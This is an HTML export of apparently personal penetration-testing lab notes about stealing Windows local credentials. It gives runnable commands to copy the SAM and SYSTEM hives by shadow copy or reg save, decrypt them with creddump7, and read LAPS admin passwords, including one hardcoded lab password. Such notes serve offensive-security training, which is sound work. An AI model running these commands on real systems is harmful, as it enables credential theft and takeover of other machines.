<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SAM/LAPS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SAM/LAPS</h1><br/><p><h2>SAM database</h2><ul><li>c:\Windows\System32\config\sam <ul><li>process system has an exclusigve lock on it</li></ul></li><li>shadow copy from admin cmd : create snapshot of C drive <ul><li> sam is partially encrypted with RC4 keys we can shaow copy them as well </li></ul></li><li>we can also obtain them from the registry <ul><li>hklm\sam</li><li>hkm\system</li><li>decrypt them using creddump7 or mimikatz </li></ul></li><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Method 1: shadow copy (create a snapshot of the C drive)</span><br />wmic shadowcopy call create Volume<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">&#39;C:\&#39;</span><br /><span style="color:#0088ff;font-weight:400">## verify it and obtain source path </span><br />vssadmin list shadows<br /><span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#ff9d00;font-weight:700">\\?\</span>GLOBALROOT<span style="color:#ff9d00;font-weight:700">\</span>Device<span style="color:#ff9d00;font-weight:700">\</span>HarddiskVolumeShadowCopy1<span style="color:#ff9d00;font-weight:700">\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>system32<span style="color:#ff9d00;font-weight:700">\</span>config<span style="color:#ff9d00;font-weight:700">\</span>sam C<span style="color:#ff9d00;font-weight:700">:\</span>users<span style="color:#ff9d00;font-weight:700">\</span>offsec.corp1<span style="color:#ff9d00;font-weight:700">\</span>Downloads<span style="color:#ff9d00;font-weight:700">\</span>sam<br /><span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#ff9d00;font-weight:700">\\?\</span>GLOBALROOT<span style="color:#ff9d00;font-weight:700">\</span>Device<span style="color:#ff9d00;font-weight:700">\</span>HarddiskVolumeShadowCopy1<span style="color:#ff9d00;font-weight:700">\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>system32<span style="color:#ff9d00;font-weight:700">\</span>config<span style="color:#ff9d00;font-weight:700">\</span>system C<span style="color:#ff9d00;font-weight:700">:\</span>users<span style="color:#ff9d00;font-weight:700">\</span>offsec.corp1<span style="color:#ff9d00;font-weight:700">\</span>Downloads<span style="color:#ff9d00;font-weight:700">\</span>system<br /><br /><span style="color:#0088ff;font-weight:400"># Medthod 2 : registry</span><br />reg save HKLM<span style="color:#ff9d00;font-weight:700">\</span>sam C<span style="color:#ff9d00;font-weight:700">:\</span>users<span style="color:#ff9d00;font-weight:700">\</span>offsec.corp1<span style="color:#ff9d00;font-weight:700">\</span>Downloads<span style="color:#ff9d00;font-weight:700">\</span>sam<br />reg save HKLM<span style="color:#ff9d00;font-weight:700">\</span>system C<span style="color:#ff9d00;font-weight:700">:\</span>users<span style="color:#ff9d00;font-weight:700">\</span>offsec.corp1<span style="color:#ff9d00;font-weight:700">\</span>Downloads<span style="color:#ff9d00;font-weight:700">\</span>system<br /><br /><span style="color:#0088ff;font-weight:400">## note they are still encrypted (creddump or mimikatz</span><br /><br /><span style="color:#0088ff;font-weight:400">## dump creds creddump7</span><br /> python pwdump.py ~<span style="color:#ff9d00;font-weight:700">/</span>OSEP<span style="color:#ff9d00;font-weight:700">/</span>SMBFolder<span style="color:#ff9d00;font-weight:700">/</span>system ~<span style="color:#ff9d00;font-weight:700">/</span>OSEP<span style="color:#ff9d00;font-weight:700">/</span>SMBFolder<span style="color:#ff9d00;font-weight:700">/</span>sam</pre></div></p><p></p><p><img src="images/49-1.png" alt="images/49-1.png" /></p><p><h2>Mitigations of SAM creds stealing : hardening local admin account</h2><ul><li>• <small>• LAPS : changes admin passwords regularly</small></li><li><small>use LAPS toolkit to </small></li><li><small>we need to find groups that have the right to fully enumerate LAPS</small></p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># option 1: powerview</span><br /><span style="color:#00117f;font-weight:400">get-netcomputer</span> <span style="color:#ff9d00;font-weight:700">-Filter</span> <span style="color:#3ad900;font-weight:400">&quot;(ms-mcs-admpwdexpirationtime=*)&quot;</span> | <span style="color:#ff9d00;font-weight:700">select</span> dnshostname<br /><span style="color:#0088ff;font-weight:400"># option 2 </span><br /><span style="color:#ff9d00;font-weight:700">Import-Module</span> .<span style="color:#ff9d00;font-weight:700">\</span>LAPSToolkit.ps1<br /><span style="color:#0088ff;font-weight:400">## find groups that can fully enumerate laps data</span><br /><span style="color:#00117f;font-weight:400">Find-LAPSDelegatedGroups</span><br /><span style="color:#0088ff;font-weight:400">## look for group members </span><br /><span style="color:#00117f;font-weight:400">Get-NetGroupMember</span> <span style="color:#ff9d00;font-weight:700">-</span>GroupName <span style="color:#3ad900;font-weight:400">&quot;LAPS Password Readers&quot;</span><br /><span style="color:#0088ff;font-weight:400">## display all computers set with laps and display hostname,clear text pass of local administrator (if the user account is part of the group), expiration time</span><br /><span style="color:#00117f;font-weight:400">Get-LAPSComputers</span><br /><br /><span style="color:#0088ff;font-weight:400">### alternativce</span><br /><span style="color:#00117f;font-weight:400">Get-ADObject</span> <span style="color:#333333;font-weight:400">-Name</span> ws04 <span style="color:#ff9d00;font-weight:700">-</span>DomainController dc01 <span style="color:#ff9d00;font-weight:700">-</span>Properties <span style="color:#00117f;font-weight:400">ms-mcs-admpwd</span><br /><br /><span style="color:#0088ff;font-weight:400">## for other user </span><br /><span style="color:#0088ff;font-weight:400">$SecPassword</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">ConvertTo-SecureString</span> <span style="color:#333333;font-weight:400">&#39;J5KCwKruINyCJBKd1dZU&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>AsPlainText <span style="color:#ff9d00;font-weight:700">-</span>Force<br /><span style="color:#0088ff;font-weight:400">$cred</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.Management.Automation.PSCredential(<span style="color:#333333;font-weight:400">&#39;rastalabs.local\ngodfrey_adm&#39;</span>, <span style="color:#0088ff;font-weight:400">$SecPassword</span>)<br /><span style="color:#00117f;font-weight:400">Get-ADObject</span> <span style="color:#333333;font-weight:400">-Name</span> ws02 <span style="color:#ff9d00;font-weight:700">-</span>DomainController dc01 <span style="color:#ff9d00;font-weight:700">-</span>Properties <span style="color:#00117f;font-weight:400">ms-mcs-admpwd</span> <span style="color:#ff9d00;font-weight:700">-</span>Credential <span style="color:#0088ff;font-weight:400">$Cred</span><br /></pre></div></p><p></p><p><img src="images/49-2.png" alt="images/49-2.png" /></p><p></p><p><img src="images/49-3.png" alt="images/49-3.png" /></p></div>
</body>
</html>
